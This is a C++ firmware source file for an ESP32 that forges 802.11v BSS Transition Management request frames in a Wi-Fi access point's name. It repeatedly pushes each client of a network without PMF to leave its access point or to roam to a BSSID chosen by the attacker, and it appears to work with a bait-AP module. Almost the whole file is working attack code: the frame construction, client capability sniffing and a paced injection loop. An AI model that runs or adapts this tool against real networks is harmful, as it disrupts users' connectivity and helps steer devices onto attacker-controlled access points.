// 802.11v BSS Transition Management (BTM) Request spoofing.
//
// Design notes (why it is shaped this way):
//   * BTM Request is a 802.11v Action frame (category 10, action 7). Note what the
//     standard does with that: every action category except Public (4), HT (7),
//     the unprotected one (11), Self-protected (15), VHT (21) and vendor specific
//     (127) counts as a robust management frame (Linux:
//     _ieee80211_is_robust_mgmt_frame()), so 802.11w/PMF does cover category 10.
//     Measured consequence: without PMF the frame is accepted -- TA = the AP's
//     BSSID is all a client looks at -- and with PMF the client's driver drops it
//     as an unprotected robust management frame before the BTM code runs
//     (net/mac80211/rx.c). This is an attack on networks whose PMF is off or
//     optional (most WPA2 deployments), not a PMF bypass.
//   * The default shape has no candidate list. Measured on a real ESP32-C5 station
//     (测试报告 §4.4.12): with a list pointing at a phantom BSSID the station
//     answers with a BTM Response and stays where it is; without a list it scans
//     by itself and, if a BSS with the same SSID and the same security is in range,
//     moves to it (reason 207 ROAMING, 0.07 s).
//     A list is still available as an option (`cand-bssid`), because naming a *real*
//     BSSID is the part the phantom version was missing: it lets the attacker say
//     "go to exactly this BSS" instead of hoping the station picks ours.
//     The BSSID Information word is a parameter, not a guess: nothing here asserts
//     what its bits mean (0 = leave it at zero until a real frame says otherwise).
//   * The client only acts when Disassociation Imminent is set *and* the
//     Disassociation Timer is non-zero: wpa_supplicant's 802.11v client calls
//     wpa_supplicant_req_scan() only in that branch. A zero timer means "no
//     deadline" and nothing happens, which is why the default here is 10 TBTT.
//   * Requests are unicast (a group-addressed BTM Request is not defined) and
//     repeated every 300 ms per client, because a single one just makes the
//     client scan once.
//   * Clients that advertise Extended Capabilities bit 19 (BSS Transition) are
//     the ones that act; that bit is learned from the client's own probe /
//     (re)association request. Clients that send the IE without the bit are
//     skipped instead of being flooded for nothing.

#include "btm.h"
#include "baitap.h"
#include "radio.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"
#include "ie_util.h"
#include "tx_guard.h"

namespace {

// A fixed sequence number is thrown away by the station's duplicate detector after
// the first copy, so a repeating spoof must advance it.
uint16_t s_seq;

// 802.11v Action field values (802.11-2020, Table 9-... "802.11v Action field").
const uint8_t kCategoryBtm = 10;
const uint8_t kActionBtmQuery = 6;
const uint8_t kActionBtmRequest = 7;
const uint8_t kActionBtmResponse = 8;

// BTM Request Request Mode bits.
const uint8_t kReqModePrefCandList = 0x01;
const uint8_t kReqModeDisassocImminent = 0x04;

// Neighbor Report element (the optional candidate).
const uint8_t kElemNeighborReport = 52;
const uint8_t kNeighborReportLen = 13;

const int kMaxClients = 8;
// Resend interval per client. One request makes the client scan once; the point
// of the attack is to make that excursion continuous.
const uint32_t kRepeatMs = 300;
// Global spacing between two injected requests: 20 frames/s is the measured ceiling
// for unicast management injection (see tx_guard.h), so the per-client interval
// must not be multiplied by the number of clients on the air.
const uint32_t kGlobalGapMs = 50;

enum client_cap_t {
    CAP_UNKNOWN = 0,  // seen, but no Extended Capabilities IE yet
    CAP_YES = 1,      // advertises 802.11v BSS Transition
    CAP_NO = 2,       // advertises Extended Capabilities without bit 19
};

struct client_t {
    uint8_t mac[6];
    uint8_t cap;
    uint8_t dialog;
    uint32_t last_ms;
    uint32_t sent;
};

bool s_active;
uint8_t s_bssid[6];
uint8_t s_channel;
uint16_t s_timer;
// Optional single candidate. s_cand_valid = 0 keeps the list-less shape (default).
uint8_t s_cand_valid;
uint8_t s_cand_bssid[6];
uint8_t s_cand_channel;
uint32_t s_cand_info;
uint32_t s_frames;
uint32_t s_responses;
uint32_t s_queries;
uint16_t s_last_status;
client_t s_clients[kMaxClients];
int s_client_count;
uint32_t s_last_tx_ms;




int note_client(const uint8_t* mac) {
    for (int i = 0; i < s_client_count; i++) {
        if (memcmp(s_clients[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    if (memcmp(mac, s_bssid, 6) == 0 || (mac[0] & 0x01) != 0) {
        return -1;  // the AP itself, or a group address
    }
    if (s_client_count >= kMaxClients) {
        return -1;
    }
    client_t* c = &s_clients[s_client_count];
    memset(c, 0, sizeof(*c));
    memcpy(c->mac, mac, 6);
    c->cap = CAP_UNKNOWN;
    return s_client_count++;
}

// Walks the client's IE list for Extended Capabilities (id 127) and records
// whether the BSS Transition bit is there.
void learn_capabilities(const uint8_t* mac, const uint8_t* ies, const uint8_t* end) {
    uint16_t len = 0;
    const uint8_t* ext = ie_find(ies, end, 127, &len);
    if (ext == nullptr) {
        return;
    }
    const int i = note_client(mac);
    if (i < 0) {
        return;
    }
    s_clients[i].cap = extcap_has_bss_transition(ext, len) ? CAP_YES : CAP_NO;
}

// Operating Class of the announced channel (802.11-2020 Annex E).
uint8_t operating_class(uint8_t channel) {
    if (channel <= 14) {
        return 81;  // 2.4 GHz, channels 1..13
    }
    if (channel <= 48) {
        return 115;
    }
    if (channel <= 64) {
        return 116;
    }
    if (channel <= 144) {
        return 117;
    }
    return 121;  // 149..161
}

// 802.11v Action frame carrying a BTM Request:
//   24 B header | category(10) | action(7) | dialog token | request mode |
//   disassociation timer (2 B) | validity interval            = 31 bytes
//   [+ Neighbor Report element when a candidate BSSID was given]  = 46 bytes
size_t build_btm_request(uint8_t* frame, const uint8_t sta[6], uint8_t dialog) {
    memset(frame, 0, 64);
    frame[0] = 0xD0;  // management, subtype 13 = action
    frame[1] = 0x00;
    memcpy(frame + 4, sta, 6);
    memcpy(frame + 10, s_bssid, 6);
    memcpy(frame + 16, s_bssid, 6);
    const uint16_t seq = s_seq++ & 0x0FFF;
    frame[22] = (uint8_t)(seq >> 4);
    frame[23] = (uint8_t)((seq & 0x0F) << 4);

    size_t n = 24;
    frame[n++] = kCategoryBtm;
    frame[n++] = kActionBtmRequest;
    frame[n++] = dialog;
    frame[n++] =
        (uint8_t)(kReqModeDisassocImminent | (s_cand_valid ? kReqModePrefCandList : 0));
    frame[n++] = (uint8_t)(s_timer & 0xFF);
    frame[n++] = (uint8_t)(s_timer >> 8);
    // Validity interval: how long the request is considered fresh, in beacon
    // intervals. 10 * a 100 TU interval is ~1 s, long enough for the scan.
    frame[n++] = 10;

    if (s_cand_valid) {
        frame[n++] = kElemNeighborReport;
        frame[n++] = kNeighborReportLen;
        memcpy(frame + n, s_cand_bssid, 6);
        n += 6;
        // BSSID Information: written little-endian, value comes from the caller.
        // Its bit meanings are NOT asserted here -- fill it from a real frame.
        frame[n++] = (uint8_t)(s_cand_info & 0xFF);
        frame[n++] = (uint8_t)((s_cand_info >> 8) & 0xFF);
        frame[n++] = (uint8_t)((s_cand_info >> 16) & 0xFF);
        frame[n++] = (uint8_t)((s_cand_info >> 24) & 0xFF);
        frame[n++] = operating_class(s_cand_channel);
        frame[n++] = s_cand_channel;
        frame[n++] = 0;  // PHY type: 0 = unknown, fill from a real frame
    }
    return n;
}

}  // namespace

bool btm_start(int index, uint16_t disassoc_timer, const uint8_t* cand_bssid,
               uint8_t cand_channel, uint32_t cand_info) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    memcpy(s_bssid, bssid, 6);
    s_channel = WiFi.channel(index);
    s_timer = (disassoc_timer == 0) ? 10 : disassoc_timer;
    s_cand_valid = (cand_bssid != nullptr) ? 1 : 0;
    if (s_cand_valid) {
        memcpy(s_cand_bssid, cand_bssid, 6);
        s_cand_channel = cand_channel;
        s_cand_info = cand_info;
    } else {
        memset(s_cand_bssid, 0, 6);
        s_cand_channel = 0;
        s_cand_info = 0;
    }
    s_active = true;

    s_client_count = 0;
    s_frames = 0;
    s_responses = 0;
    s_queries = 0;
    s_last_status = 0;
    s_last_tx_ms = 0;

    // Same rule as RRM: do not retune while the bait AP owns this channel, or its
    // beacon restarts and a freshly steered station is dropped.
    if (!(baitap_running() && baitap_channel() == s_channel)) {
        radio_set_channel("btm", s_channel);
    }
    // Without the receive callback the capability learning never sees a client
    // and every request would go out blind.
    attack_sniffer_enable();
    return true;
}

void btm_stop(void) {
    s_active = false;
}

void btm_add_station(const uint8_t mac[6]) {
    note_client(mac);
}

void btm_step(void) {
    if (!s_active) {
        return;
    }
    const uint32_t now = millis();
    if (s_last_tx_ms != 0 && now - s_last_tx_ms < kGlobalGapMs) {
        return;
    }
    // One frame per iteration: the short-frame pool is shared with everything
    // else, and a full round of eight clients then costs ~16 ms, far inside the
    // 300 ms repeat interval.
    for (int i = 0; i < s_client_count; i++) {
        client_t* c = &s_clients[i];
        if (c->cap == CAP_NO) {
            continue;
        }
        if (c->sent > 0 && now - c->last_ms < kRepeatMs) {
            continue;
        }
        c->last_ms = now;
        c->dialog = (uint8_t)((c->dialog == 0 || c->dialog == 255) ? 1 : c->dialog + 1);
        uint8_t frame[64];
        const size_t len = build_btm_request(frame, c->mac, c->dialog);
        if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
            s_frames++;
            c->sent++;
            s_last_tx_ms = now;
        }
        return;
    }
}

void btm_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    if (!s_active || len < 24) {
        return;
    }
    const uint8_t* dest = frame + 4;
    const uint8_t* src = frame + 10;

    if (type == 0 && subtype == 13 && len >= 28 && memcmp(frame + 16, s_bssid, 6) == 0) {
        if (frame[24] == kCategoryBtm && frame[25] == kActionBtmResponse) {
            // Action = 8: dialog token, status code, termination delay, then the
            // optional target BSSID / candidate list.
            s_responses++;
            s_last_status = frame[27];
            return;
        }
        if (frame[24] == kCategoryBtm && frame[25] == kActionBtmQuery) {
            s_queries++;
            return;
        }
    }

    if (type != 0) {
        return;
    }
    // Capability learning: the client advertises its Extended Capabilities IE in
    // its probe request and in every (re)association request it sends.
    if (memcmp(dest, s_bssid, 6) == 0) {
        if (subtype == 0 && len > 28) {
            note_client(src);
            learn_capabilities(src, frame + 28, frame + len);  // cap + listen interval
            return;
        }
        if (subtype == 2 && len > 34) {
            note_client(src);
            learn_capabilities(src, frame + 34, frame + len);  // + current AP address
            return;
        }
    }
    if (subtype == 4) {  // probe request (usually group-addressed)
        note_client(src);
        learn_capabilities(src, frame + 24, frame + len);
        return;
    }
    if (memcmp(frame + 16, s_bssid, 6) == 0) {
        note_client(src);  // any other traffic of the BSS: remember the MAC only
    }
}

void btm_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }
    const uint16_t timer_backup = s_timer;
    if (s_timer == 0) {
        s_timer = 10;
    }
    // 只读快照：这个函数不该改动正在跑的攻击状态
    const uint8_t cand_backup = s_cand_valid;
    uint8_t cand_bssid_backup[6];
    memcpy(cand_bssid_backup, s_cand_bssid, 6);
    const uint8_t cand_ch_backup = s_cand_channel;
    const uint32_t cand_info_backup = s_cand_info;

    uint8_t frame[64];
    // 形态一：默认，不带候选列表
    s_cand_valid = 0;
    size_t len = build_btm_request(frame, fake_sta, 1);
    const uint16_t timer = (uint16_t)(frame[28] | (frame[29] << 8));
    Serial.printf("BTMTEST state=%s len=%u cat=%u act=%u dialog=%u req_mode=0x%02X"
                  " imm=%u candlist=%u timer=%u validity=%u\n",
                  s_active ? "on" : "off", (unsigned)len, (unsigned)frame[24], (unsigned)frame[25],
                  (unsigned)frame[26], (unsigned)frame[27],
                  (unsigned)((frame[27] & kReqModeDisassocImminent) ? 1 : 0),
                  (unsigned)((frame[27] & kReqModePrefCandList) ? 1 : 0), (unsigned)timer,
                  (unsigned)frame[30]);
    Serial.print("BTMTEST hex=");
    for (size_t i = 0; i < len; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    // 形态二：带一个指定候选（元素 id 52 / len 13）
    s_cand_valid = 1;
    if (s_cand_bssid[0] == 0 && s_cand_bssid[1] == 0 && s_cand_bssid[2] == 0) {
        memcpy(s_cand_bssid, placeholder, 6);
        s_cand_bssid[5] = 0x66;
    }
    if (s_cand_channel == 0) {
        s_cand_channel = 6;
    }
    len = build_btm_request(frame, fake_sta, 1);
    // 元素从 31 开始：eid(31) len(32) bssid(33..38) info(39..42) op_class(43) ch(44) phy(45)
    const uint32_t info = (uint32_t)frame[39] | ((uint32_t)frame[40] << 8) |
                          ((uint32_t)frame[41] << 16) | ((uint32_t)frame[42] << 24);
    Serial.printf("BTMTEST cand len=%u req_mode=0x%02X eid=%u ie_len=%u bssid=", (unsigned)len,
                  (unsigned)frame[27], (unsigned)frame[31], (unsigned)frame[32]);
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", frame[33 + i]);
    }
    Serial.printf(" info=0x%08X op_class=%u ch=%u phy=%u\n", (unsigned)info, (unsigned)frame[43],
                  (unsigned)frame[44], (unsigned)frame[45]);
    Serial.print("BTMTEST cand hex=");
    for (size_t i = 0; i < len; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    s_timer = timer_backup;
    s_cand_valid = cand_backup;
    memcpy(s_cand_bssid, cand_bssid_backup, 6);
    s_cand_channel = cand_ch_backup;
    s_cand_info = cand_info_backup;
}

bool btm_active(void) {
    return s_active;
}

const char* btm_state_name(void) {
    return s_active ? "on" : "off";
}

uint32_t btm_frames(void) {
    return s_frames;
}

uint32_t btm_capable_clients(void) {
    uint32_t n = 0;
    for (int i = 0; i < s_client_count; i++) {
        if (s_clients[i].cap == CAP_YES) {
            n++;
        }
    }
    return n;
}

uint32_t btm_skipped_clients(void) {
    uint32_t n = 0;
    for (int i = 0; i < s_client_count; i++) {
        if (s_clients[i].cap == CAP_NO) {
            n++;
        }
    }
    return n;
}

uint32_t btm_responses(void) {
    return s_responses;
}

uint32_t btm_queries(void) {
    return s_queries;
}

uint16_t btm_last_status(void) {
    return s_last_status;
}


uint16_t btm_disassoc_timer(void) {
    return s_timer;
}
